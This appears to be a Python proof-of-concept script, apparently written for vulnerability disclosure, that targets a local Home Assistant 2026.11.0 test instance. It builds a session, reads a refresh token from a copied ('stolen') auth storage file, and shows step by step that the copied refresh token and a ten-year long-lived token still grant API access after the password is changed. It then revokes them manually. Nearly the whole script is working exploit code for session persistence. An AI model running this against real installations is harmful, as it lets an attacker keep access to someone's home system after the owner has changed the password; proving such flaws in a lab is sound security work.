#!/usr/bin/env python3
"""HA 2026.11.0 gold-standard proof driver. Runs INSIDE a helper container
(entrypoint python3) on --network host against our own instance at
127.0.0.1:8123. Logs every step to /proof/LOG.txt."""
import base64, json, time, urllib.request, urllib.error, urllib.parse, asyncio, sys
from datetime import datetime, timezone

BASE = "http://127.0.0.1:8123"
CLIENT_ID = "http://127.0.0.1:8123/"
PW1 = "Proof-Pass-1-Initial!"
PW2 = "Proof-Pass-2-Changed!"
LOG = open("/proof/LOG.txt", "a", buffering=1)

def ts():
    return datetime.now(timezone.utc).isoformat()

def log(msg):
    line = f"[{ts()}] {msg}"
    print(line, flush=True)
    LOG.write(line + "\n")

def http(method, path, data=None, token=None, form=False):
    url = BASE + path
    body = None; headers = {}
    if data is not None:
        if form:
            body = urllib.parse.urlencode(data).encode()
            headers["Content-Type"] = "application/x-www-form-urlencoded"
        else:
            body = json.dumps(data).encode()
            headers["Content-Type"] = "application/json"
    if token:
        headers["Authorization"] = f"Bearer {token}"
    req = urllib.request.Request(url, data=body, headers=headers, method=method)
    try:
        with urllib.request.urlopen(req, timeout=30) as r:
            raw = r.read().decode()
            return r.status, (json.loads(raw) if raw.strip().startswith(("{","[")) else raw)
    except urllib.error.HTTPError as e:
        raw = e.read().decode()
        try: parsed = json.loads(raw)
        except Exception: parsed = raw
        return e.code, parsed

def jwt_payload(tok):
    try:
        p = tok.split(".")[1]
        p += "=" * (-len(p) % 4)
        return json.loads(base64.urlsafe_b64decode(p))
    except Exception as e:
        return {"decode_error": str(e)}

async def ws_session(access_token, commands):
    import aiohttp
    out = []
    async with aiohttp.ClientSession() as s:
        async with s.ws_connect(BASE.replace("http", "ws") + "/api/websocket") as ws:
            hello = await ws.receive_json()
            out.append(("hello", hello.get("type")))
            await ws.send_json({"type": "auth", "access_token": access_token})
            authmsg = await ws.receive_json()
            out.append(("auth", authmsg.get("type")))
            if authmsg.get("type") != "auth_ok":
                return out
            for i, cmd in enumerate(commands, start=1):
                cmd = dict(cmd); cmd["id"] = i
                await ws.send_json(cmd)
                while True:
                    m = await ws.receive_json()
                    if m.get("id") == i and m.get("type") == "result":
                        out.append((cmd["type"], m))
                        break
    return out

def main():
    log("=== HA PROOF START ===")
    # wait for instance
    for i in range(60):
        st, _ = http("GET", "/api/onboarding")
        if st == 200: break
        time.sleep(2)
    log(f"onboarding endpoint status={st}")

    # 1. create owner user via onboarding
    st, resp = http("POST", "/api/onboarding/users", {
        "name": "Proof Owner", "username": "proofowner", "password": PW1,
        "client_id": CLIENT_ID, "language": "en"})
    log(f"STEP1 create user status={st} keys={list(resp) if isinstance(resp, dict) else resp}")
    code = resp.get("auth_code") if isinstance(resp, dict) else None
    if not code:
        log("FATAL no auth_code"); return
    # 2. exchange code
    st, tok = http("POST", "/auth/token", {
        "grant_type": "authorization_code", "code": code, "client_id": CLIENT_ID}, form=True)
    log(f"STEP2 code exchange status={st} keys={list(tok) if isinstance(tok, dict) else tok}")
    A1 = tok["access_token"]; R1 = tok["refresh_token"]
    log(f"STEP2 access_token_expires_in={tok.get('expires_in')} refresh_prefix={R1[:12]}...")
    # 3. access works
    st, api = http("GET", "/api/", token=A1)
    log(f"STEP3 GET /api/ with A1 status={st} body={str(api)[:120]}")
    json.dump({"A1": A1, "R1": R1}, open("/proof/session1.json", "w"))

    # 4. mint long-lived access token via WS (lifespan 3650, exactly like the frontend)
    res = asyncio.run(ws_session(A1, [
        {"type": "auth/long_lived_access_token", "client_name": "proof-script", "lifespan": 3650},
        {"type": "auth/refresh_tokens"},
    ]))
    LLAT = None; parents = None
    for name, m in res:
        if name == "auth/long_lived_access_token":
            LLAT = m.get("result")
            log(f"STEP4 LLAT mint success={m.get('success')}")
        if name == "auth/refresh_tokens":
            parents = m.get("result")
            log(f"STEP4 refresh_tokens list: " + json.dumps(
                [{k: t.get(k) for k in ('id','type','client_name','expire_at')} for t in (parents or [])]))
    if LLAT:
        pl = jwt_payload(LLAT)
        log(f"STEP4 LLAT jwt iss={pl.get('iss')} exp-iat={(pl.get('exp',0)-pl.get('iat',0))}s = {((pl.get('exp',0)-pl.get('iat',0))/86400):.1f} days")
        json.dump({"LLAT": LLAT, "iss": pl.get("iss")}, open("/proof/llat.json", "w"))
    st, api = http("GET", "/api/", token=LLAT)
    log(f"STEP4b GET /api/ with LLAT (pre-change) status={st}")

    log("=== waiting for .storage/auth to be persisted (driver polls host file via /config mount) ===")
    log("=== PROOF PAUSE: host operator copies .storage/auth now ===")
    json.dump({"ready_for_copy": True}, open("/proof/READY_FOR_COPY.json", "w"))
    # wait until host signals copy done
    import os
    for i in range(120):
        if os.path.exists("/proof/COPY_DONE.json"): break
        time.sleep(2)
    log("copy signal received")

    stolen = json.load(open("/proof/stolen_parsed.json"))
    R1_copy = stolen["normal_refresh_token"]
    expire_before = stolen.get("normal_expire_at")
    log(f"STEP5 copied material parsed: normal_refresh_prefix={R1_copy[:12]}... matches_live_R1={R1_copy == R1} expire_at_in_file={expire_before}")

    # 6. change password through the real WS command (core path: rehash only)
    res = asyncio.run(ws_session(A1, [
        {"type": "config/auth_provider/homeassistant/change_password",
         "current_password": PW1, "new_password": PW2},
    ]))
    for name, m in res:
        if isinstance(m, dict):
            log(f"STEP6 change_password result success={m.get('success')} error={m.get('error')}")

    time.sleep(2)
    # 7a. PROOF A: copied refresh token still mints access after password change
    st, tok2 = http("POST", "/auth/token", {
        "grant_type": "refresh_token", "refresh_token": R1_copy, "client_id": CLIENT_ID}, form=True)
    log(f"STEP7a refresh grant from COPIED token post-password-change status={st}")
    A2 = tok2.get("access_token") if isinstance(tok2, dict) else None
    if A2:
        st, api = http("GET", "/api/", token=A2)
        log(f"STEP7a GET /api/ with access minted from copied refresh status={st} body={str(api)[:120]}")
        st, cfg = http("GET", "/api/config", token=A2)
        log(f"STEP7a GET /api/config status={st} (location_name/version present: {isinstance(cfg, dict) and 'version' in cfg})")
    # 7b. PROOF B: pre-change LLAT still authenticates after password change
    st, api = http("GET", "/api/", token=LLAT)
    log(f"STEP7b GET /api/ with pre-change 10y LLAT post-password-change status={st} body={str(api)[:120]}")
    st, who = http("GET", "/api/config", token=LLAT)
    log(f"STEP7b GET /api/config with LLAT status={st}")

    # 8. password really changed: old fails, new works (login flow)
    def login(pw):
        st, flow = http("POST", "/auth/login_flow", {
            "client_id": CLIENT_ID, "handler": ["homeassistant", None],
            "redirect_uri": CLIENT_ID})
        if st != 200: return st, None
        fid = flow["flow_id"]
        st, res2 = http("POST", f"/auth/login_flow/{fid}", {"username": "proofowner", "password": pw})
        return st, res2
    st, r_old = login(PW1)
    log(f"STEP8 login with OLD password status={st} type={r_old.get('type') if isinstance(r_old, dict) else r_old} errors={r_old.get('errors') if isinstance(r_old, dict) else ''}")
    st, r_new = login(PW2)
    log(f"STEP8 login with NEW password status={st} type={r_new.get('type') if isinstance(r_new, dict) else r_new} has_code={isinstance(r_new, dict) and bool(r_new.get('result'))}")

    # 9. negative control: garbage token
    st, _ = http("GET", "/api/", token="garbage.token.value")
    log(f"STEP9 garbage bearer status={st} (expect 401)")

    # 10. manual revocation (the ONLY path that kills them): delete both parents via WS using A2
    parent_ids = stolen["all_refresh_ids"]
    cmds = [{"type": "auth/delete_refresh_token", "refresh_token_id": pid} for pid in parent_ids]
    res = asyncio.run(ws_session(A2, cmds))
    for name, m in res:
        if isinstance(m, dict):
            log(f"STEP10 delete_refresh_token success={m.get('success')}")
    time.sleep(1)
    st, tok3 = http("POST", "/auth/token", {
        "grant_type": "refresh_token", "refresh_token": R1_copy, "client_id": CLIENT_ID}, form=True)
    log(f"STEP10b refresh grant from copied token AFTER manual revocation status={st} body={str(tok3)[:160]} (expect 400)")
    st, _ = http("GET", "/api/", token=LLAT)
    log(f"STEP10c GET /api/ with LLAT AFTER manual revocation of parent status={st} (expect 401)")
    log("=== HA PROOF END ===")

if __name__ == "__main__":
    main()
